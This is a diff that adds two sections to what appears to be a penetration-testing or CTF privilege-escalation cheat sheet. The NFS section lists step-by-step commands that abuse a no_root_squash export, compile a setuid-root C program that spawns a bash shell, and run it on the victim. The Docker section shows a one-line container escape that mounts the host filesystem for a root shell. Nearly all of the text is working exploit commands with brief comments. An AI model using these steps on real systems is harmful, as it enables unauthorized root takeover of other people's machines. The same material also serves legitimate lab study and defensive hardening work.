@@ -406,4 +406,46 @@ ls -la /tmp
 
 ## NFS Root Squashing
 
+```shell
+cat /etc/exports
+#includes option 'no_root_squash'
+#this means that folder can be mounted
+
+#in attacker machine
+showmount -e 10.10.13.14
+#check export list for victim machine
+#shows /tmp
+
+mkdir /tmp/mountme
+
+mount -o rw,vers=2 10.10.13.14:/tmp /tmp/mountme
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
+
+cat /tmp/mountme/x.c
+
+gcc /tmp/mountme/x.c -o /tmp/mountme/x
+
+chmod +s /tmp/mountme/x
+
+#in victim machine
+cd /tmp
+
+./x
+#we are root now
+```
+
 ## Docker
+
+```shell
+id
+#we are a part of docker group
+
+#get exploit from GTFObins
+
+docker images
+#check images
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+#this gives us root shell
+```
